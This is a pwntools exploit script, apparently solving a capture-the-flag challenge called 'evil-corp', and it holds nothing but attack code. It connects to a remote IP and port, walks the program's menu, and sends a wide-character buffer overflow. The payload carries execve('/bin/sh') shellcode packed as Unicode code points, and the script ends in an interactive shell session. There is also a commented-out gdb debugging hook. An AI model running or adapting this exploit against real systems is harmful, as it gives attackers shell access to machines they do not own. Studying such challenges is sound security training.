from pwn import *
def debug():
	gdb.attach(p,'''
		b* ContactSupport+110
		c
		x/4gx $rsp

		''')
shellcode=U"\U00003148\U000048d2\U00002fbb\U0000622f\U00006e69\U0000732f\U00004868\U0000ebc1\U00005308\U00008948\U000050e7\U00004857\U0000e689\U00003bb0\U00003148\U00000ff6\U00000005"
#p=process("./evil-corp")
p=remote("94.237.48.205",31377)
#debug()
p.sendline("eliot")

p.sendline("4007")

p.sendline("2")
#p.send(U"\U00001111"*2048+U"\U00002222"*1954+U"\U00011000")
p.sendline(U"\U00001111"*2048+shellcode+U"\U00000000"*(1954-len(shellcode))+U"\U00011000"+U"\U00000000")

p.interactive()